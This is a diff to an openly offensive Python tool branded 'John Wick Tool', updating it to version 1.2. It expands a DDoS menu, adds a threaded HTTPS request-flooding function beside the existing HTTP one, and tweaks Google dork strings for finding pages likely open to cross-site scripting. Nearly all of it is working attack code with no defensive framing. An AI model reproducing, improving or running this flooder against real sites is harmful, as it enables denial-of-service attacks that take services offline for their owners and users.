@@ -29,7 +29,7 @@ banner = f'''
                            {white} ▄▄▄▄    ▄▄▄       ▄▄▄▄    ▄▄▄         ▓██   ██▓ ▄▄▄        ▄████  ▄▄▄      
                             ▓█████▄ ▒████▄    ▓█████▄ ▒████▄        ▒██  ██▒▒████▄     ██▒ ▀█▒▒████▄    
                             ▒██▒ ▄██▒██  ▀█▄  ▒██▒ ▄██▒██  ▀█▄       ▒██ ██░▒██  ▀█▄  ▒██░▄▄▄░▒██  ▀█▄   {green}Created {red}By {yellow}John {blue}Wick{blue}		
-                            ▒██░█▀  ░██▄▄▄▄██ ▒██░█▀  ░██▄▄▄▄██      ░ ▐██▓░░██▄▄▄▄██ ░▓█  ██▓░██▄▄▄▄██   {cyan}Version {red}({yellow} 1{red}.{yellow}1{red} ){red}
+                            ▒██░█▀  ░██▄▄▄▄██ ▒██░█▀  ░██▄▄▄▄██      ░ ▐██▓░░██▄▄▄▄██ ░▓█  ██▓░██▄▄▄▄██   {cyan}Version {red}({yellow} 1{red}.{yellow}2{red} ){red}
                             ░▓█  ▀█▓ ▓█   ▓██▒░▓█  ▀█▓ ▓█   ▓██▒     ░ ██▒▓░ ▓█   ▓██▒░▒▓███▀▒ ▓█   ▓██▒
                             ░▒▓███▀▒ ▒▒   ▓▒█░░▒▓███▀▒ ▒▒   ▓▒█░      ██▒▒▒  ▒▒   ▓▒█░ ░▒   ▒  ▒▒   ▓▒█░
                             ▒░▒   ░   ▒   ▒▒ ░▒░▒   ░   ▒   ▒▒ ░    ▓██ ░▒░   ▒   ▒▒ ░  ░   ░   ▒   ▒▒ ░
@@ -78,7 +78,7 @@ ddos = f'''
             {cyan}╔═════════════════════════════════════════════════════════════════════════════════════════════════╗
             {cyan}║                                  {red}Welcome {blue}To {yellow}JOHNWICK {green}TOOL{cyan}                                       ║
             {cyan}║                                                                                                 ║
-            {cyan}║ {green}LAYER7 {red}: {cyan}HTTP                                                                                   ║
+            {cyan}║ {green}LAYER7 {red}: {cyan}HTTP {red}, {cyan}HTTPS                                                                           ║
             {cyan}║ {green}LAYER4 {red}: {cyan}UDP {red}, {cyan}TCP                                                                              ║
             {cyan}║                                                                                                 ║
             {cyan}║ {red}#{green}John {yellow}Wick{blue} Tool{cyan}                                                                                 ║
@@ -133,8 +133,8 @@ dork_xss = '''
         inurl:”webapp/wcs”
         inurl:”ProductListingView”
         inurl:”AdvancedSearchDisplay”
-        inurl:”CompareProductsDisplayView”
-        inurl:parent_category_rn
+        inurl:”CompareProductsDisplayView=”
+        inurl:parent_category_rn=
 
 '''
 
@@ -360,7 +360,7 @@ while True:
         def http():
             while True:
                 try:
-                    if url.split('://')[0] == 'https' or 'http':
+                    if url.split('://')[0] == 'https':
                         s = socket(AF_INET,SOCK_STREAM)
                         s = ssl.wrap_socket(s, server_hostname=target)
                         s.connect((target,port))
@@ -368,7 +368,22 @@ while True:
                         s = socket(AF_INET,SOCK_STREAM)
                         s.connect((target,port))
                     for _ in range(rpc):
-                        s.send(f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: */*\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nCookies: {cookie}\r\n\r\n').encode()
+                        s.send(f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: */*\r\nCache-Control: no-cache\r\nConnection: keep-alive\r\n\r\n').encode()
+                except:
+                    pass
+
+        def https():
+            while True:
+                try:
+                    if url.split('://')[0] == 'https':
+                        s = socket(AF_INET,SOCK_STREAM)
+                        s = ssl.wrap_socket(s, server_hostname=target)
+                        s.connect((target,port))
+                    else:
+                        s = socket(AF_INET,SOCK_STREAM)
+                        s.connect((target,port))
+                    for _ in range(rpc):
+                        s.send(f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nCookie: {cookie}\r\n\r\n'.encode())
                 except:
                     pass
 
@@ -440,6 +455,7 @@ while True:
                         {cyan}╚══════════════════════════════════════════════════════════════════╝''')
         
         def bypass_loginn():
+            system('cls' if name == 'nt' else 'clear')
             print(bn)
             print(bypass_login)
 
@@ -473,6 +489,10 @@ while True:
             print(Fore.LIGHTRED_EX+"\n["+Fore.LIGHTYELLOW_EX+"$"+Fore.LIGHTRED_EX+"]", Fore.LIGHTGREEN_EX + "Attack", Fore.LIGHTCYAN_EX + "Started", Fore.LIGHTYELLOW_EX + "!" + Fore.LIGHTRED_EX + "!" + Fore.LIGHTGREEN_EX + "!")
             for _ in range(threads):
                 thr(target=http).start()
+        elif method == 'https:':
+            print(Fore.LIGHTRED_EX+"\n["+Fore.LIGHTYELLOW_EX+"$"+Fore.LIGHTRED_EX+"]", Fore.LIGHTGREEN_EX + "Attack", Fore.LIGHTCYAN_EX + "Started", Fore.LIGHTYELLOW_EX + "!" + Fore.LIGHTRED_EX + "!" + Fore.LIGHTGREEN_EX + "!")
+            for _ in range(threads):
+                thr(target=https).start()
         elif method == 'udp':
             print(Fore.LIGHTRED_EX+"\n["+Fore.LIGHTYELLOW_EX+"$"+Fore.LIGHTRED_EX+"]", Fore.LIGHTGREEN_EX + "Attack", Fore.LIGHTCYAN_EX + "Started", Fore.LIGHTYELLOW_EX + "!" + Fore.LIGHTRED_EX + "!" + Fore.LIGHTGREEN_EX + "!")
             for _ in range(threads):
@@ -520,6 +540,5 @@ while True:
         elif method == 'clear':
             system('cls' if name == 'nt' else 'clear')
             print(banner)
-
     except:
         pass
